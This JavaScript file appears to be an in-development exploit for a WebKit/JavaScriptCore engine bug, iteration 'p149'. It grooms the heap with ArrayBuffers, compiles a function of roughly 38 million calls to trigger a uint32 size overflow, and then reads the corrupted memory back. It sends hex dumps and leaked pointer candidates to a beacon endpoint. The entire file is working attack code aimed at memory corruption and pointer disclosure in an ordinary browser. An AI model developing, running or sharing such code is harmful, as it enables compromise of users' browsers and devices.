// p149 — ArrayBuffer direct-read + JSString pointer-corruption detector
// Key insight: JSString is 16B = [header(8B)][m_fiber(8B)]. NO m_length field.
// JSString::length() dereferences m_fiber as StringImpl* → reads StringImpl::m_length.
// The sweep corrupts m_fiber, NOT m_length directly.
// ArrayBuffer backing stores go through same marge heap (Gigacage disabled).
// We read the overwritten ArrayBuffer data directly via Uint8Array.
// N = 38,348,816 (stride 112, verified). p148b's N=35,792,228 does NOT overflow.

(function() {
  var BOOT_MS = Date.now();
  function tagNow() { return Date.now() - BOOT_MS; }

  function B(tag, body) {
    var url = '/beacon/V149-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      x.open('POST', url, true);
      if (body) x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body ? '{' + body + '}' : null);
    } catch (e) {
      try {
        var g = new XMLHttpRequest();
        g.open('GET', url + (body ? '&b=' + encodeURIComponent('{' + body + '}') : ''), true);
        g.send();
      } catch (e2) {}
    }
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hexU32LE(u8, off) {
    return hexByte(u8[off+3]) + hexByte(u8[off+2]) + hexByte(u8[off+1]) + hexByte(u8[off]);
  }
  function hexU64LE(u8, off) { return hexU32LE(u8, off+4) + hexU32LE(u8, off); }

  B('BOOT', '"ms0":' + tagNow());

  // ---- Constants ----
  var N_CALLS   = 38348816;         // ceil(2^32 / 112), verified stride
  var ALLOC_SZ  = 100096;           // uint32 wrap of N×112
  var IMPL_HDR  = 20;               // StringImpl header: refCount(4)+length(4)+data8(8)+hash(4)=20
  var STR_LEN   = ALLOC_SZ - IMPL_HDR; // 100076 chars for exact size class match
  var CANARY_S  = 0x41;             // 'A'
  var CANARY_AB = 0xCC;             // ArrayBuffer canary byte
  var N_BAIT    = 20;
  var N_TGT_STR = 8;                // string targets (JSString m_fiber corruption)
  var N_TGT_AB  = 8;                // ArrayBuffer targets (direct data read)

  // ---- PHASE 1: Allocate baits (same marge size class) ----
  B('P1-BAIT', '"n":' + N_BAIT + ',"sz":' + ALLOC_SZ);
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    baits.push(new ArrayBuffer(ALLOC_SZ));
  }

  // ---- PHASE 2: String targets (JSString pointer corruption detector) ----
  B('P2-STR-TGT', '"n":' + N_TGT_STR + ',"len":' + STR_LEN);
  var strTargets = [];
  for (var j = 0; j < N_TGT_STR; j++) {
    var s = 'A'.repeat(STR_LEN);
    if (s.length !== STR_LEN) { B('STR-LEN-ERR-' + j + '-' + s.length); return; }
    s.charCodeAt(0); // force resolve
    strTargets.push(s);
  }

  // ---- PHASE 3: ArrayBuffer targets (direct data read channel) ----
  B('P3-AB-TGT', '"n":' + N_TGT_AB + ',"sz":' + ALLOC_SZ);
  var abTargets = [];
  var abViews = [];
  for (var k = 0; k < N_TGT_AB; k++) {
    var ab = new ArrayBuffer(ALLOC_SZ);
    var u8 = new Uint8Array(ab);
    // Fill with canary pattern: 0xCC with index marker every 112 bytes
    for (var f = 0; f < ALLOC_SZ; f++) u8[f] = CANARY_AB;
    for (var m = 0; m < ALLOC_SZ; m += 112) {
      u8[m] = k & 0xFF;
      u8[m+1] = (m >> 8) & 0xFF;
      u8[m+2] = (m) & 0xFF;
      u8[m+3] = 0xDD;
    }
    abTargets.push(ab);
    abViews.push(u8);
  }

  // ---- PHASE 4: Free baits + GC pressure ----
  B('P4-FREE');
  for (var i2 = 0; i2 < baits.length; i2++) baits[i2] = null;
  baits = null;

  var fr;
  try {
    fr = new FinalizationRegistry(function(h) {
      B('FR-' + h);
    });
  } catch (e) { fr = null; }

  // GC pressure: 64MB/round, 12 rounds
  var gcRound = 0;
  function gcPressure() {
    var a1 = new Array(4000000).fill(0);
    var a2 = new Array(4000000).fill(0);
    a1[3999999] = gcRound; a2[3999999] = gcRound;
    a1 = null; a2 = null;
    gcRound++;
    if (gcRound < 12) {
      setTimeout(gcPressure, 25);
    } else {
      B('GC-DONE-12', '"ms":' + tagNow());
      phaseBuild();
    }
  }
  B('GC-START');
  gcPressure();

  // ---- PHASE 5: Build giant function ----
  function phaseBuild() {
    B('BUILD', '"n":' + N_CALLS);
    var CHUNK = 4000000;
    var nChunks = Math.floor(N_CALLS / CHUNK);
    var rem = N_CALLS - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    if (callChunk.length !== CHUNK * 4) { B('CHUNK-ERR'); return; }
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__v149fn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__v149ok=true;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB', '"mb":' + Math.round(blob.size / 1048576) + ',"ms":' + tagNow());
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__v149ok ? 'OK' : 'FAIL'), '"ms":' + tagNow());
      if (!window.__v149fn) { B('NO-FN'); return; }
      phaseCall();
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ---- PHASE 6: Call (trigger overflow) then read ----
  function phaseCall() {
    setTimeout(function() {
      B('CALLING');
      var tStart = Date.now();
      var returned = false;
      try { window.__v149fn(function(){}); returned = true; }
      catch (ex) { B('CATCH', '"e":"' + (ex.message || '').substring(0, 60) + '"'); }
      var ms = Date.now() - tStart;

      if (!returned) {
        B('NO-RETURN', '"ms":' + ms);
      } else {
        B('SURVIVED', '"ms":' + ms);
        phaseRead();
      }

      setTimeout(function() {
        B('ALIVE-10S', '"ms":' + (Date.now() - tStart));
      }, 10000);
    }, 100);
  }

  // ---- PHASE 7: Read results ----
  function phaseRead() {
    // Channel A: String targets — check for m_fiber corruption
    var strCorrupted = 0;
    for (var i = 0; i < strTargets.length; i++) {
      var len;
      try { len = strTargets[i].length; } catch (e) { len = -1; }
      if (len === -1) {
        B('S-CRASH-' + i);
        strCorrupted++;
      } else if (len !== STR_LEN) {
        strCorrupted++;
        B('S-' + i + '-len=' + len, '"hex":"0x' + len.toString(16) + '","delta":' + (STR_LEN - len));
      }
    }
    B('STR-CORRUPT-' + strCorrupted + '-of-' + strTargets.length);

    // Channel B: ArrayBuffer targets — read raw sweep data
    var abCorrupted = 0;
    for (var j = 0; j < abViews.length; j++) {
      var u8 = abViews[j];
      var changed = false;
      // Check first 1120 bytes (10 entries worth at stride 112)
      for (var off = 0; off < Math.min(u8.length, 1120); off++) {
        if (u8[off] !== CANARY_AB && !((off % 112 === 0 && u8[off] === (j & 0xFF)) ||
            (off % 112 === 1) || (off % 112 === 2) || (off % 112 === 3 && u8[off] === 0xDD))) {
          changed = true;
          break;
        }
      }

      if (changed) {
        abCorrupted++;
        // Dump first 3 entries (336 bytes) as hex
        var hex0 = '';
        for (var b = 0; b < Math.min(112, u8.length); b++) hex0 += hexByte(u8[b]);
        B('AB-' + j + '-E0-' + hex0);

        var hex1 = '';
        for (var b2 = 112; b2 < Math.min(224, u8.length); b2++) hex1 += hexByte(u8[b2]);
        B('AB-' + j + '-E1-' + hex1);

        var hex2 = '';
        for (var b3 = 224; b3 < Math.min(336, u8.length); b3++) hex2 += hexByte(u8[b3]);
        B('AB-' + j + '-E2-' + hex2);

        // Extract potential pointers from entry at known offsets
        // BaselineCallLinkInfo: PackedRawSentinelNode at 0-11
        // Entry+24 = m_slowPathCallDestination candidate
        // Entry+72 = ArrayProfile start
        // Entry+88 = ValueProfile start (m_buckets[0])
        B('AB-' + j + '-PTR24=' + hexU64LE(u8, 24));
        B('AB-' + j + '-PTR88=' + hexU64LE(u8, 88));
        B('AB-' + j + '-PTR96=' + hexU64LE(u8, 96));

        // Scan for first non-zero 8-byte value (potential pointer)
        for (var p = 0; p < Math.min(112, u8.length); p += 8) {
          var val = 0;
          for (var vb = 0; vb < 8; vb++) val += u8[p+vb];
          if (val > 0) {
            B('AB-' + j + '-NZ@' + p + '=' + hexU64LE(u8, p));
          }
        }
      } else {
        // Quick fingerprint: check if ANYTHING changed in the entire buffer
        var anyChange = false;
        for (var q = 0; q < u8.length; q += 4096) {
          if (u8[q] !== CANARY_AB && u8[q] !== (j & 0xFF)) { anyChange = true; break; }
        }
        if (anyChange) {
          abCorrupted++;
          // Find first changed offset
          for (var r = 0; r < u8.length; r++) {
            var expected = CANARY_AB;
            var mod = r % 112;
            if (mod === 0) expected = j & 0xFF;
            else if (mod === 3) expected = 0xDD;
            if (u8[r] !== expected && mod !== 1 && mod !== 2) {
              B('AB-' + j + '-LATE@' + r + '=' + hexByte(u8[r]));
              // Dump 112 bytes around this offset
              var start = Math.floor(r / 112) * 112;
              var hexE = '';
              for (var h = start; h < Math.min(start + 112, u8.length); h++) hexE += hexByte(u8[h]);
              B('AB-' + j + '-ENTRY@' + start + '-' + hexE);
              break;
            }
          }
        } else {
          B('AB-' + j + '-CLEAN');
        }
      }
    }
    B('AB-CORRUPT-' + abCorrupted + '-of-' + abViews.length);

    // Summary
    B('RESULT', '"str":' + strCorrupted + ',"ab":' + abCorrupted + ',"ms":' + tagNow());
    B('FINAL-OK');
  }
})();
